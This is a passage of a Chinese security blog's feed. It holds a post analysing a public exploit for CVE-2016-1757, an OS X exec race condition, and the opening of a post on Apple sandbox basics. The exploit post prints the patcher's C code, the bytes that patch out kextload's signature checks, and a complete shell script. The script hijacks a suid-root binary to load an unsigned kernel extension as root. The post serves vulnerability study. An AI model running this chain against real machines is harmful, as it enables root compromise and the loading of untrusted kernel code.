<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076">POC下载</a><br>本文记录了对POC的简单的调试和分析，对该漏洞有一个初步的认识，为后续的研究做好准备工作。</li>
</ul>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="bounds checking" scheme="http://turingh.github.io/tags/bounds-checking/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757利用程序分析]]></title>
    <link href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/19/CVE-2016-1757利用程序分析/</id>
    <published>2016-04-19T18:49:14.000Z</published>
    <updated>2016-04-29T20:37:06.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
<p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
<p><a href="https://github.com/turingH/exploit" target="_blank" rel="external">https://github.com/turingH/exploit</a></p>
<p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>
<a id="more"></a>
<h1 id="0x01_Exploit概览">0x01 Exploit概览</h1><h2 id="1-1_Exploit使用到了哪些技术">1.1 Exploit使用到了哪些技术</h2><ol>
<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>漏洞的原理。</li>
<li><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a>。</li>
</ol>
<h2 id="1-2_Exploit目录结构">1.2 Exploit目录结构</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  executer ls -al</span><br><span class="line">total <span class="number">184</span></span><br><span class="line">drwxr-xr-x@ <span class="number">16</span> turing  staff    <span class="number">544</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .</span><br><span class="line">drwxr-xr-x@ <span class="number">33</span> turing  staff   <span class="number">1122</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">10</span>:<span class="number">29</span> ..</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">6148</span>  <span class="number">3</span> <span class="number">30</span> <span class="number">16</span>:<span class="number">45</span> .DS_Store</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">16384</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .executer.c.swp</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> root    wheel    <span class="number">102</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> FakeKext.kext</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff    <span class="number">397</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> Makefile</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff      <span class="number">0</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> __init__.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">2061</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> build_<span class="built_in">exec</span>_patch.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">1669</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> differ.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff   <span class="number">2085</span>  <span class="number">4</span> <span class="number">12</span> <span class="number">14</span>:<span class="number">53</span> differ.pyc</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff  <span class="number">15308</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">11</span>:<span class="number">00</span> executer</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">17534</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">02</span> executer.c</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff     <span class="number">37</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> kextload_<span class="built_in">disable</span>_signature_checks.binpatch</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff   <span class="number">1849</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">10</span>:<span class="number">45</span> load_kext.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff    <span class="number">591</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> root_shell.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff   <span class="number">1106</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> unload_kext.sh</span><br><span class="line">➜  executer</span><br></pre></td></tr></table></figure>
<p>主要由5个部分组成</p>
<ul>
<li>FakeKext.kext：最终加载的测试内核扩展。</li>
<li>*.py: 用来生成对<code>traceroute6</code>的<code>binpatch</code>文件。</li>
<li>executer：通过<code>binpatch</code>文件，对需要执行的目标程序进行<code>patch</code>。</li>
<li>kextload_disable_signature_checks.binpatch：存储了<code>kextload</code>需要<code>patch</code>的地址与内容。</li>
<li>*.sh:驱动整个流程的脚本。</li>
</ul>
<h1 id="0x02_Exploit详细分析">0x02 Exploit详细分析</h1><p>如果直接打开<code>load_kext.sh</code>有<strong>可能</strong>一眼看不出到底流程是什么样子的，所以的先对几个重要的组件做一下详细的分析。</p>
<h2 id="2-1_executer与binpatch">2.1 executer与binpatch</h2><p><code>executer</code>是整个<code>exploit</code>中最核心的部分，核心功能有两个。</p>
<ul>
<li>通过<code>apply_patch</code>函数获取目标进程需要<code>patch</code>的内容并保存在内存中。</li>
<li>通过<code>fork</code>子进程在执行目标程序时存在的时间窗口通过<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/#1-3_Ports">PORT</a>对目标进程进行内存的改写。</li>
</ul>
<p>通过时间窗口改写目标进程的内存和<code>POC</code>中的实现大同小异，可以参考之前分析<code>POC</code>的<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">文章</a>。</p>
<p>这里简单的分析一个<code>apply_patch</code>函数与</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// at what offset (rounded down to a page boundary) from the start of the mapping in the target should we write?</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_start_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// how much should we write (rounded up to a page boundary)</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_write_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pointer to the replacement bytes to overwrite with</span></span><br><span class="line"><span class="keyword">char</span>* replacement_bytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* apply the patch, recording the lowest and highest addresses we touch */</span></span><br><span class="line"><span class="comment">// original is page-aligned</span></span><br><span class="line"><span class="comment">// 对original文件进行patch</span></span><br><span class="line"><span class="comment">// 这个patch的函数只是为了对kextload进行patch，关闭对未签名内核扩展的验证</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kextload_disable_signature_checks</span><br><span class="line"> * 0000000000000000  C9 20 00 00 03 00 00 00  31 C0 C3 94 27 00 00 05  . ......1...'...</span><br><span class="line"> * 0000000000000010  00 00 00 90 90 90 31 C0  0D 28 00 00 05 00 00 00  ......1..(......</span><br><span class="line"> * 0000000000000020  90 90 90 31 C0                                    ...1.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 理论上patch_length = 0x1000,因为length经过roundup的处理。</span></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">apply_patch</span><span class="params">(<span class="keyword">char</span>* original, size_t original_length, <span class="keyword">char</span>* patch, size_t patch_length)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// patch format is:</span></span><br><span class="line">  <span class="comment">// u32 offset</span></span><br><span class="line">  <span class="comment">// u32 length</span></span><br><span class="line">  <span class="comment">// u8 * length bytes to be written</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两个字段用来计算内存中需要保存的数据的开始位置和解释位置</span></span><br><span class="line">  <span class="keyword">char</span>* lowest = (<span class="keyword">char</span>*)UINTPTR_MAX; </span><br><span class="line">  <span class="keyword">char</span>* highest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> remaining = patch_length;</span><br><span class="line">  <span class="keyword">while</span> (remaining &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset = *(<span class="keyword">uint32_t</span>*)patch;</span><br><span class="line">    <span class="keyword">uint32_t</span> length = *(<span class="keyword">uint32_t</span>*)(patch+<span class="number">4</span>);</span><br><span class="line">    remaining -= <span class="number">8</span>;</span><br><span class="line">    patch += <span class="number">8</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">    	以kextload_disable_signature_checks为例</span><br><span class="line">    	0x000020c9处开始0x00000003个字节改写为0x31 0xc0 0xc3</span><br><span class="line">    	0x00002794处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    	0x0000280D处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    */</span></span><br><span class="line">    </span><br><span class="line">   	<span class="comment">/* 错误处理*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// record if we're extending the boundaries of touched pages</span></span><br><span class="line">    <span class="comment">// 根据patch的地址重新计算两个变量值</span></span><br><span class="line">    <span class="keyword">if</span> ((original+offset) &lt; lowest) &#123;</span><br><span class="line">      lowest = original+offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((original+offset+length) &gt; highest) &#123;</span><br><span class="line">      highest = original+offset+length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply the patch</span></span><br><span class="line">    <span class="built_in">memcpy</span>(original+offset, patch, length);</span><br><span class="line">    remaining -= length;</span><br><span class="line">    patch += length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//需要改写到目标进程的数据的起始</span></span><br><span class="line">  replacement_bytes = ptr_rounddown(lowest);</span><br><span class="line">  <span class="comment">//改写内容在目标进程中的起始位置</span></span><br><span class="line">  target_patch_start_offset = replacement_bytes - original;</span><br><span class="line">  <span class="comment">//需要改写的内容的长度</span></span><br><span class="line">  target_patch_write_length = ptr_roundup(highest) - replacement_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合对<code>port</code>的利用，流程大致如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/patch.png" alt="patch"></p>
<p>所以<code>executer</code>可以理解为一个抽象的工具，该工具的作用就是通过<code>binpatch</code>文件的内容，对目标程序进行<code>patch</code>并执行。</p>
<h2 id="2-2_通过Patch绕过加载驱动对签名的要求">2.2 通过Patch绕过加载驱动对签名的要求</h2><p>整个bindiff的比较，以及源码位置可以参照之前的这篇文章。<a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a>。</p>
<p>这里说一下几个被<code>patch</code>掉的函数的关系。</p>
<table>
<thead>
<tr>
<th>patch点</th>
<th>行为</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x000020c9</td>
<td>整个函数内容变为return 0；</td>
<td>使得加载扩展时的权限检测都返回成功</td>
</tr>
<tr>
<td>0x00002794</td>
<td>绕过对sub_0979函数的调用</td>
<td>sub_0979会调用签名合法的检测</td>
</tr>
<tr>
<td>0x0000280d</td>
<td>绕过对sub_085c函数的调用</td>
<td>sub_085c会调用sub_0979</td>
</tr>
</tbody>
</table>
<h2 id="2-3_load_kext-sh">2.3 load_kext.sh</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># loading an unsigned kext is a two step process - first we need root</span><br><span class="line"># then we need to get the com.apple.rootless.kext-management entitlement</span><br><span class="line"></span><br><span class="line"># so let's build a simple shellscript to run as root:</span><br><span class="line"></span><br><span class="line"># 加载一个没有签名的驱动程序</span><br><span class="line"># 1.root权限</span><br><span class="line"># 2.获取com.apple.rootless.kext-management权限</span><br><span class="line"></span><br><span class="line">if [ -z $1 ]</span><br><span class="line">then</span><br><span class="line">  echo 'usage: ./load_kext.sh &lt;path/to/kext&gt;'</span><br><span class="line">  exit $E_MISSING_POS_PARAM</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># we have a binary patch for the 10.11.3 version of kextload (which has the kext-management entitlement)</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext</span><br><span class="line"></span><br><span class="line"># 通过patch可以使得kextload拥有权限</span><br><span class="line"></span><br><span class="line"># first, we need a thin'ed version of kextload</span><br><span class="line"># 从fat格式中提取x86_64的macho文件</span><br><span class="line">lipo -thin x86_64 -output kextload_64 `which kextload`</span><br><span class="line"></span><br><span class="line"># 生成patch kextload并加载内核扩展的脚本</span><br><span class="line">echo '#!/bin/zsh' &gt; kext_loading_helper.sh</span><br><span class="line">echo "# run me as root to load: $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "/usr/sbin/chown -R root:wheel $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "./executer -p kextload_disable_signature_checks.binpatch -o kextload_64 -- `which kextload` $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">chmod +x kext_loading_helper.sh</span><br><span class="line"></span><br><span class="line"># build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites</span><br><span class="line"># its entrypoint with shellcode to exec the script we just wrote (note that its a zsh script so will maintain euid 0)</span><br><span class="line"># 根据python脚本生成对traceroute6进行patch的binpatch文件</span><br><span class="line"># 目标是为了利用漏洞在root权限下执行上面生成的kext_loading_helper.sh脚本</span><br><span class="line">python build_exec_patch.py `which traceroute6` `pwd`/kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># use the exploit to apply that patch at exec time to the suid-root binary</span><br><span class="line"># 利用刚刚生成的binpatch执行traceroute6</span><br><span class="line">./executer -p traceroute6_exec_kextloader.binpatch -o `which traceroute6` -- `which traceroute6` -invalid</span><br><span class="line"></span><br><span class="line"># cleanup</span><br><span class="line">rm -rf kextload_64 kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># * if you choose a fat binary pass a lipo'ed thin version to -o</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext:</span><br></pre></td></tr></table></figure>
<p>整体的执行流程大致如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/kextload.png" alt="kextload"></p>
<h1 id="0x03_小结">0x03 小结</h1><p>至此<code>CVE-2016-1757</code>的分析告一段落，结合<code>POC</code>的分析有几个知识需要巩固与思考。</p>
<ul>
<li><code>PORT</code>的使用。</li>
<li><code>exec</code>的流程。</li>
<li>内存<code>patch</code>在漏洞利用时的用法。</li>
<li>在<code>exec</code>的启动流程中，根据新旧内存对象替换的时机比较稳定的找到时间窗口。</li>
</ul>
<p>漏洞的成因个人总结为2点：</p>
<ul>
<li>进程在执行过程中权限会得到提高</li>
<li>进程在执行的流程存在被<code>patch</code>的机会</li>
</ul>
<h1 id="引用">引用</h1><p>1.<a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></p>
<p>2.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
<p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
<p><a href="https://github.com/turingH/exploit">https://github.com/turingH/exploit</a></p>
<p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[apple沙盒研究之基础知识]]></title>
    <link href="http://turingh.github.io/2016/04/18/apple%E6%B2%99%E7%9B%92%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://turingh.github.io/2016/04/18/apple沙盒研究之基础知识/</id>
    <published>2016-04-18T15:12:47.000Z</published>
    <updated>2016-04-19T18:52:38.000Z</updated>
    <content type="html"><![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
<p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8" target="_blank" rel="external">计算机安全</a>领域，<strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[1]</a>#cite_note-1)。</p>
<p>沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93" target="_blank" rel="external">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96" target="_blank" rel="external">虚拟化</a>的一种。</p>
<p>沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="external">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA" target="_blank" rel="external">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92" target="_blank" rel="external">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6" target="_blank" rel="external">恶意代码</a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[2]</a>#cite_note-2)。</p>
<p>— 维基百科,沙盒 (计算机安全)</p>
</blockquote>
<p>这样一段话说的已经很清楚了，关于在<code>OS X</code>系统中沙盒的简单应用，也有文章解释过了，这些不是本文的核心内容，有兴趣的读者可以自行<code>google</code>。</p>
<p>在<code>OS X</code>以及<code>IOS</code>系统中限制了进程对一些资源的访问权限，例如网络、某些特殊路径、文件的读写等等，限定了进程的一些行为，从而保证进程不会做出超越权限的操作。</p>
<a id="more"></a>
<p>沙盒听上去的感觉是一个进程在一个有保护的环境中执行，不会做出规定范围内不允许的事情，给人的感觉可能是这样的：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_feels_like.png.png" alt="沙盒"></p>
<p>这样的理解对应用开发来说已经够用了，通过理解沙盒的内部实现，发现沙盒的实质其实更像是这样的：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_really.png" alt="沙盒"></p>
<p>而在<code>OS X</code>中沙盒也被称作<code>seatbelt</code>。<code>APP</code>的一举一动都被<code>TrustedBSD</code>的<code>HOOK</code>组件监控，根据沙盒使用的<code>profile</code>中的配置做出相应的处理。</p>
<p>下面 就通过简单的分析沙盒的工作流程，详细了解沙盒的工作原理。</p>
<h2 id="1-2_沙盒工作流程与相关系统组件">1.2 沙盒工作流程与相关系统组件</h2><p>沙盒的大致工作流程入下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_workflow.png" alt="sandbox_workflow"></p>
<ul>
<li><code>1</code>进程尝试进行一次系统调用（system call），调用内核功能。</li>
<li><code>2、3</code>MAC层需要根据该进程的安全策略判断此次系统调用是否可以执行。</li>
<li><code>4、5、6、7、8、9</code>如果存在策略的话，通过<code>sandbox.kext</code>（hook函数）和<code>AppleMatch.kext</code>（沙盒的profile解析）两个内核扩展实现权限的检查。</li>
<li><code>10</code>返回调用结果</li>
</ul>
<p>与沙盒系统相关的模块大致如下：</p>
<ul>
<li>libSystem.dylib: 提供<code>sandbox_init</code>、<code>sandbox_free_error</code>等函数。</li>
<li>libSandbox.dylib: 提供解析，编译，生成<code>*.sb</code>的沙盒<code>profile</code>的函数。</li>
<li>sandbox.kext：提供了system call的hook函数</li>
<li>AppleMatch.kext：提供了解析<code>profile</code>的函数</li>
</ul>
<p>结构图大致如下：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_birdview.png" alt="结构图"></p>
<h1 id="1-3_小结">1.3 小结</h1><p>​    沙盒的工作流程大致可以总结为：</p>
<ol>
<li><p>通过<code>sandbox_init</code>初始化某沙盒策略脚本并编译为二进制文件</p>
</li>
<li><p>在进程进行<code>system call</code>时，通过<code>TrustedBSD</code>提供的<code>hook</code>模块，利用<code>Sandbox.kext</code>提供的<code>system call hook</code>函数，结合沙盒策略进行判断，该进程是否有权限执行该<code>system call</code>。</p>
</li>
</ol>
<p>   通过对这些基础知识的了解，可以进入对沙盒的进一步研究了，在下一章通过逆向以及部分源码，从代码实现的层面进行更深一层次的分析。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
<p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a>领域，<strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[1]</a>#cite_note-1)。</p>
<p>沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96">虚拟化</a>的一种。</p>
<p>沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">恶意代码</a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[2]</a>#cite_note-2)。</p>
<p>— 维基百科,沙盒 (计算机安全)</p>
</blockquote>
